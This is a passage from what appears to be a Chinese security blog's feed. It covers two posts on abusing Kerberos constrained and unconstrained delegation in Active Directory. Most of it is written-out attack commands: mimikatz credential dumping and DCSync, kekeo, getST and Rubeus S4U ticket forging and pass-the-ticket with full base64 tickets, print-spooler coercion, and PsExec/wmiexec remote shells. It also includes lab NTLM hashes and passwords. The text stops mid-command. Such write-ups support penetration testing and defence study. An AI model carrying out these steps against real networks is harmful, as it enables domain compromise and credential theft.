/ticket:doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQ0bC1JFRFRFQU0uUkVEoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZKOCA88wggPLoAMCARKhAwIBAqKCA70EggO5H/WWv61D37Lh8CgUrZXK+OCIcG1ppRSAswcwQuaD4XOCz+v9+wZRJ6xY1DRAQ7HK0fIrp96Z54o0al1nMCGXkKRrq4+UyiTuDABdCUxj/bKj0m/DanX6Bm82LFah0J8CRpFsbt5i1F0U/<span class="number">0</span>t79e8lGbWqmTajaeTgYQrLFmWMUTL8+DQ7E02wth14UY/rBBF/oDwdVhoFovwvkjSiLYx3ePyX20Gmz8IH+<span class="number">1</span>ReqZajI8I4FGn1fV6FSzlUI7eWMumOkV61iV3uW1Zw7OqawRTcbx/<span class="number">33</span>rBjkpKsBCY0Gx41q63a8HiLua1tJZkJOERmUWjr/<span class="number">7</span>EZeZ+RbcgvDT3yOGD1L0y2iHTnGk1+maS3Rbee7EtERg4RmSwXUMnoRsle6/oVFyVdGhpbf8ePiCUY1IQCLNIt7YcleNljrOxSZwPIH1lBwIxiRNrgyhnJbcFKhroZg+dbITKaZYP1j1jcOdlpA2t5qF/kgIcuTSyz7E8bMvm+<span class="number">34</span>TwLjOF+bw+<span class="number">5</span>O3riugezUL0nhZRxxZGYfixtOLTN+wxLfDOvqzBbE9HOSJJOeoxGsktl8y5ULQ1cSxEyYjklxlMrv8/t2jJKJE60VrJS+f+VhYw0de+<span class="number">6</span>AJ08aSWJrfAQQ6T9aAyBFr+flOnx93aIYb5ql6W5rZ9Q5OKDcms/<span class="number">1</span>rIzVDoPdB2ZAQxPkquHB8vFAXO86rKw1k1SauMxn8sOFVdocF56eWHIEUegVe4mpGLipQMTMJnFCGhuq1IlLZbPTnFykDM9cR+FZb3d5uUN45BGIS2TEKtie6yBROP5mX3F6273srlBM/XOgOUXPnradx1RUPJ2zEM9L8PYKKm516wTJLirmAYRI4FSdQ3hHuMLeTrHNE8BggLf1AhTQizCf7iUJFf7hJv09gIugLFNXtqakKFeAnxz7Ej+X9Q3xyaR39IBIKPrtd/ChkbDZYiID9n31sGQ4oTyYEQDoef4zIhq/x3qRxeroCFKG4yRdVKo8eBEq4a5TPuHIbstXO<span class="comment">//3ZAcxFmK8Kcs+PHbkgyDyGiLdhf2GjnGDtBL1Hj4nJHVCXZR49XNhpCKY2iG/JkVq0RFoxn1X06BY7WcMQybIoXeD0jjXrEQn7Qh6xe6SsRsu5YU0npq8TBEcI6F3wtzGZX9KMLnHIRRfcsBlCLi5LOgIl/byAkR/ImxzlhVi/TxDn1p3kDOj+qHzcayOm0SBzr4kES/T6DCsoSCaeAYUzR5CSn4hnEtTzoTJGmAgR602Hp2HymQSfjlQQk9rqPiZCGLg7i+3GjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCrZ+acKyJr6OeDK5YKeYM0oQ0bC1JFRFRFQU0uUkVEohYwFKADAgEBoQ0wCxsJV0VCLTIwMTIkowcDBQBA4QAApREYDzIwMjMwMjA3MDgzOTM4WqYRGA8yMDIzMDIwNzE4MzkzOFqnERgPMjAyMzAyMTQwODM5MzhaqA0bC1JFRFRFQU0uUkVEqSAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZA==</span></span><br><span class="line"></span><br><span class="line"># 直接dir</span><br><span class="line">dir \\ad02<span class="number">-2016.</span>redteam.red\c$</span><br></pre></td></tr></table></figure><p>![image.png](6.png %}</p><h4 id="方法3：使用机器账户的Hash值-getST"><a href="#方法3：使用机器账户的Hash值-getST" class="headerlink" title="方法3：使用机器账户的Hash值 | getST"></a>方法3：使用机器账户的Hash值 | getST</h4><p>同思路2一致，也是使用机器账户的Hash值，但这里使用Impacket工具套件中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py" target="_blank" rel="noopener">getST.py</a>脚本请求服务票据，并利用该脚本通过<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a>工具远程登录<br>利用条件：</p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz获取机器账户NTLM Hash值</span><br><span class="line">mimikatz.<span class="keyword">exe</span> <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"># 使用getST申请服务票据</span><br><span class="line">.\getST.<span class="keyword">exe</span> -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -spn cifs/ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -impersonate administrator redteam.<span class="keyword">com</span>/web-<span class="number">2012</span>$ -hashes :<span class="number">1</span>d01ff5cd4825306ff1a7599204525ec</span><br><span class="line"></span><br><span class="line"># 使用票据远程访问</span><br><span class="line"><span class="keyword">set</span> KRB5CCNAME=administrator.ccache </span><br><span class="line">.\wmiexec.<span class="keyword">exe</span> -<span class="keyword">k</span> redteam.<span class="keyword">com</span>/administrator@ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -<span class="keyword">no</span>-pass -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -codec gbk</span><br></pre></td></tr></table></figure>![image.png](7.png %}</li></ol><h4 id="方法4：使用机器账户的Hash值-kekeo"><a href="#方法4：使用机器账户的Hash值-kekeo" class="headerlink" title="方法4：使用机器账户的Hash值 | kekeo"></a>方法4：使用机器账户的Hash值 | kekeo</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:web-2012$ /domain:redteam.red /NTLM:40ee25b2c3f7ac3370429b18aca51e81"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请administrator权限的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_web-2012$@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:ldap/ad02-2016.redteam.red"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## kekeo注入票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@redteam.red_ldap~ad02-2016.redteam.red@redteam.red.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz通过ldap服务导出hash</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_ldap~ad02-2016.redteam.red@REDTEAM.RED.kirbi"</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir \\ad02-<span class="number">2016</span>.redteam.red\c$</span><br><span class="line"></span><br><span class="line"><span class="comment"># psexec</span></span><br><span class="line">.\Psexec.exe -accepteula \\ad02-<span class="number">2016</span>.redteam.red cmd</span><br></pre></td></tr></table></figure><p>![image.png](8.png %}<br>ldap账户<br>![image.png](9.png %}</p><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><blockquote><p>域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p></blockquote><h4 id="方法1：使用服务账户的票据-kekeo"><a href="#方法1：使用服务账户的票据-kekeo" class="headerlink" title="方法1：使用服务账户的票据 | kekeo"></a>方法1：使用服务账户的票据 | kekeo</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 通过<span class="selector-tag">kekeo</span>请求服务用户的<span class="selector-tag">TGT</span></span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:saulgoodman</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.red</span> /<span class="selector-tag">password</span><span class="selector-pseudo">:Saul</span>!@<span class="selector-id">#456</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></span><br><span class="line"></span><br><span class="line">## 同理此处利用<span class="selector-tag">ntlm</span> <span class="selector-tag">hash</span>也是可以进行请求的</span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:websec</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.club</span> /<span class="selector-tag">NTLM</span><span class="selector-pseudo">:XXXXX</span></span><br></pre></td></tr></table></figure><p>![image.png](10.png %}</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用票据通过伪造S4U请求以administrator身份访问websec的ST</span></span><br><span class="line">tgs::s4u /<span class="symbol">tgt:</span>TGT_saulgoodman<span class="variable">@REDTEAM</span>.RED_krbtgt~redteam.red<span class="variable">@REDTEAM</span>.RED.kirbi /<span class="symbol">user:</span>Administrator<span class="variable">@redteam</span>.red /<span class="symbol">service:</span>cifs/AD02<span class="number">-2016</span>.redteam.red</span><br></pre></td></tr></table></figure><p>![image.png](11.png %}</p><p>kekeo当前路径下会出现administrator的ticket (用于访问saulgoodman的CIFS服务), 访问saulgoodman的cifs服务: 使用kekeo导入票据访问域控。<br><strong>cifs服务</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## kekeo导入这个tiket</span></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD02-<span class="number">2016.redteam</span>.red@REDTEAM.RED.kirbi</span><br><span class="line"></span><br><span class="line"><span class="comment">## cmd</span></span><br><span class="line">.<span class="string">\PsExec.exe</span> <span class="string">\\ad02-2016.redteam.red</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="comment">## dir</span></span><br><span class="line">dir <span class="string">\\ad02-2016.redteam.red\c$</span></span><br></pre></td></tr></table></figure><p>![image.png](12.png %}</p><p>![image.png](13.png %}</p><p><strong>ldap服务</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## <span class="selector-tag">mimikatz</span>导入<span class="selector-tag">ptt</span></span><br><span class="line"><span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@redteam</span>.red<span class="keyword">@REDTEAM</span>.RED_cifs~AD02-2016.redteam.red<span class="keyword">@REDTEAM</span>.RED.kirbi</span><br><span class="line"></span><br><span class="line">## mimikatz不用本机管理员，导入kiket即可不用 <span class="string">"privilege::debug"</span></span><br><span class="line"><span class="attribute">lsadump:</span>:dcsync /<span class="attribute">domain:</span>redteam.com /all /csv</span><br></pre></td></tr></table></figure><p>![image.png](14.png %}</p><p>![image.png](15.png %}</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议&lt;code&gt;S4u2self（Service for User to Self）&lt;/code&gt;和&lt;code&gt;S4U2proxy（Service for User to Proxy）&lt;/code&gt;。&lt;br&gt;约束委派有两种：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;仅使用Kerberos，不能进行协议转换&lt;/li&gt;
&lt;li&gt;使用任何身份验证协议&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="委派" scheme="https://chenzidu.github.io/categories/%E5%A7%94%E6%B4%BE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>非约束性委派</title>
    <link href="https://chenzidu.github.io/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/"/>
    <id>https://chenzidu.github.io/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/</id>
    <published>2023-02-23T03:31:09.000Z</published>
    <updated>2024-03-11T07:47:58.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务。</strong><br>如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务。</p><a id="more"></a><p>![image.png](1.png %}</p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程的问题在于：<strong>TGT2不被限制，服务1完全可以用它来请求访问任何想访问的服务。</strong> 攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p><h2 id="配置非约束委派"><a href="#配置非约束委派" class="headerlink" title="配置非约束委派"></a>配置非约束委派</h2><h3 id="机器账户配置"><a href="#机器账户配置" class="headerlink" title="机器账户配置"></a>机器账户配置</h3><p>![image.png](2.png %}</p><h3 id="服务账户配置"><a href="#服务账户配置" class="headerlink" title="服务账户配置"></a>服务账户配置</h3><p>域账户注册SPN成为服务账户</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/win10<span class="selector-class">.redteam</span><span class="selector-class">.red</span> susan #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span><span class="selector-class">.red</span> web-<span class="number">2012</span> #web-<span class="number">2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span>.red</span><br></pre></td></tr></table></figure><p>![image.png](3.png %}</p><h2 id="侦察手段"><a href="#侦察手段" class="headerlink" title="侦察手段"></a>侦察手段</h2><blockquote><p>当服务账号或主机被设置为非约束性委派时，其userAccountControl属性会包含TRUSTED_FOR_DELEGATION，而TRUSTED_FOR_DELEGATION的标志位，对应的值是0x80000，也即是524288。当前账户值为66048，而590336-66048&#x3D;524288</p></blockquote><p>![image.png](4.png %}</p><h3 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询非约束机器账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=red"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br><span class="line"> </span><br><span class="line"># 查询非约束委派服务账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br></pre></td></tr></table></figure><h3 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查找非约束机器账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> redteam.com -DomainController AD01<span class="number">-2016</span></span><br><span class="line"></span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br><span class="line"></span><br><span class="line"># 查找非约束服务账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetUser -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br></pre></td></tr></table></figure><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><h4 id="方法1：构造服务账户票据"><a href="#方法1：构造服务账户票据" class="headerlink" title="方法1：构造服务账户票据"></a>方法1：构造服务账户票据</h4><p>利用条件：</p><ol><li>服务账户设置了非约束性委派</li><li>已知服务账户的密码口令信息</li></ol><p>这里已知mssqlsrv服务账户密码password，并且ken设置了非约束性委派<br>    使用<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具进行操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造服务账户ken的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:saulgoodman /domain:redteam.com /password:Saul!@#456 /ticket:saulgoodman.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用刚才伪造的ken票据，向域服务器申请CIFS服务票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"Tgs::s4u /tgt:TGT_saulgoodman@REDTEAM.COM_krbtgt~redteam.com@REDTEAM.COM.kirbi /user:administrator@redteam.com /service:cifs/AD01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用mimikatz将该票据注入当前的会话中，</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_administrator@redteam.com@REDTEAM.COM_saulgoodman@REDTEAM.COM.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问目标共享盘</span></span><br><span class="line">dir \\ad01<span class="literal">-2016</span>\C<span class="variable">$</span></span><br></pre></td></tr></table></figure><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：诱使域管理员访问机器"><a href="#方法1：诱使域管理员访问机器" class="headerlink" title="方法1：诱使域管理员访问机器"></a>方法1：诱使域管理员访问机器</h4><blockquote><p>偏理想化，不实用</p></blockquote><p>当域管理员使用net use等远程访问命令，模拟域控管理员访问WIN7主机，设置了非约束性委派的主机可以抓取到域控管理员的TGT。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>域内主机的机器账户开启非约束委派</li><li>域控管理员远程访问</li></ol><p>假设域控管理员执行：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 域控用户访问域内主机</span><br><span class="line"><span class="keyword">net</span> <span class="keyword">use</span> \\WIN10-1.redteam.<span class="keyword">lab</span></span><br></pre></td></tr></table></figure><p>导出票据，执行攻击</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 域内主机导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 查看票据</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::list"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 清空票据，可以使用绝对路径</span></span><br><span class="line">kerberos::purge [ticket]</span><br></pre></td></tr></table></figure><p>![image.png](5.png %}</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导入内存</span></span><br><span class="line">mimikatz.exe <span class="string">"kerberos::ptt [0;cfd6c]-2-0-60a10000-Administrator@krbtgt-REDTEAM.LAB.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 访问目标盘</span></span><br><span class="line">dir \\DC2016.redteam.lab\c$</span><br></pre></td></tr></table></figure><p>![image.png](6.png %}</p><h4 id="方法2：结合打印机漏洞（SpoolSample）"><a href="#方法2：结合打印机漏洞（SpoolSample）" class="headerlink" title="方法2：结合打印机漏洞（SpoolSample）"></a>方法2：结合打印机漏洞（SpoolSample）</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。<br>利用条件：</p><ol><li>需要Administrator权限</li><li>需要2012 R2以上，2012 r2以下版本不在rpc中暴露Spooler服务</li></ol><p>利用过程：<br>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>工具监听</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询打印服务是否开启|域控上查看</span></span><br><span class="line">sc query spooler</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure><p>![image.png](7.png %}<br>使用<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>工具执行打印机漏洞利用，进行强制验证</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 强制回连，获得域控机器账户的TGT</span><br><span class="line">SpoolSample.<span class="keyword">exe</span> ad01-<span class="number">2016</span> web-<span class="number">2012</span></span><br><span class="line"></span><br><span class="line">## 域外工具</span><br><span class="line"><span class="keyword">python</span> dementor.<span class="keyword">py</span> -d domain -<span class="keyword">u</span> username -<span class="keyword">p</span> password 回连ip 目标ip</span><br><span class="line"><span class="keyword">python3</span> printerbug.<span class="keyword">py</span> redteam.<span class="keyword">com</span>/admin:<span class="string">"Aa123456"</span>@<span class="number">192.168</span>.<span class="number">10.250</span>  回连主机</span><br></pre></td></tr></table></figure><p>![image.png](8.png %}<br>Rubeus监听到票据并导入该票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rubeus导入票据</span></span><br><span class="line">Rubeus.exe ptt <span class="regexp">/ticket:doIFGjCCBRagAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtSRURURUFNLkxBQqOCA90wggPZoAMCARKhAwIBAqKCA8sEggPHdOzGGhqNLMiflfgJCrXq6OzfDy1u+wHM8mdH8IpkVEbl+TX5liKAPQ/i</span>4nIewzu9yq8kO9tEZYRhARky6B2Bw4RWD6tx9nytF24Q6AhvpzIfxAK2zJ1fLX5AtH9yyqbVVdd+ryoR8PjUCl09IdyfdmTfMW45olQhHVMG1l2Oz9agg8tUANOFT9HjbxrDJjgCvFMEJ7hJ3s1dsYORZfvXk31J4fn3VRLHj<span class="regexp">/5N9XpQQ5n8T24p8KGmvfK/</span>SdPDU4im<span class="regexp">/Jud5syF60l1sMH/</span>UUr4UYaHSAFM3ui1sgaeO45MdPq7hAVVRaBX8WjogadUTeRghh47nH4aAsbAqxmmCNkTKkYSAPdc8fKIAFQNSONpEsBnaCrLo+QoD<span class="regexp">/x+VIkNHbPYA7Zt3kb/</span>neoH65zP5PTm95pAjmnx7P56<span class="regexp">/UdwgxkVTd7KHsj4VQ/</span><span class="number">7</span>BsHx8GfpXKcmev08KSGvMvXM6+zr9XbrnLne6bnabNTUHuqfh6+<span class="number">4</span>qImMlig6RMmeSpJa0hFAzJdhzkZGO9LLL2OZSOME2ngSvffCunaNqdIGEbev8i5kVMhwg4upv9tClWW+h0mEJWeZ332WF2LKI2VEKjQePAbkM3UUmr+<span class="number">1</span>vUXKEcKPEqQ58fQH2+Nr4naONswOTVb1CLdXB7<span class="regexp">/SdfCcYU26Pgm7vQnl2uNb6LhlpPYAXGoaofUjRV0d3JIR+2oXSt5ia5auCyhU6/</span>nKXPP1KBCiQzjRACSOyeRivxTaxVZExbtLNi932psyMOKCb6qE<span class="regexp">/JHyhve5Iu/</span>nBp78RcfjoTrNaqUCO<span class="regexp">/ZxA2AUlUEpcmoU+Vmm+fQEb828EZtKFoyxKPBKtbK/</span>jLsgk8qEoy5JwIEmMIeIP0D95vc+Rzp5A<span class="regexp">/WSiN0yn9RXqd8On/</span>UBjOW7O42uKhrVJrJ5ClOu+HdHN2WkejBkslnBJYSaL+A69eA5qb+yAJhJqmlSFupfGhQhzm<span class="regexp">/YNDdcifKU+47R3WF3n9OvSqQgLush9/</span>hkGPgwVLp1Wj6LQHzofIujVRDOybAeNt+lATwzQGVHpeUOWy<span class="regexp">/iXV/</span>UxTPGT3VBiPpIm1E813QKw8eWTxLm5YeQJrk0Uyj<span class="regexp">/qalqqo5gskI0fY7Sq60pMA9t1TA6nrdmcQzesKWAcf6QmEmQorTcPw4znaM5QSKAGwRQRGGt57RADimgrs/</span>R2K3Rqa3C<span class="regexp">/ePlSgaPJN3jS5AGHF9j1/</span>MJE0Eb8ZwPXTI0P77NCDWthqK7wFzcyKkrpNjodMf<span class="regexp">/KFs96wkVqWBJ0Xy5qza9rFy/</span>r79WZtICfxLfbdF8KGrS5LCCIYKMVhPq56OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIP6GQ<span class="regexp">/T97TyQDQUyz2ZnOBxcZEcgQ0iexOoMgGUOzdNUoQ0bC1JFRFRFQU0uTEFCohQwEqADAgEBoQswCRsHREMyMDE2JKMHAwUAYKEAAKURGA8yMDIyMDUxODA3NDcxMFqmERgPMjAyMjA1MTgxNzQ3MTBapxEYDzIwMjIwNTI1MDc0NzEwWqgNGwtSRURURUFNLkxBQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLUkVEVEVBTS5MQUI=</span></span><br></pre></td></tr></table></figure><p>![image.png](9.png %}</p><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>导出Hash</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz导出域内用户Hash</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p>![image.png](10.png %}</p><p>使用psexec远程登录：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">psexec</span><span class="selector-class">.exe</span> <span 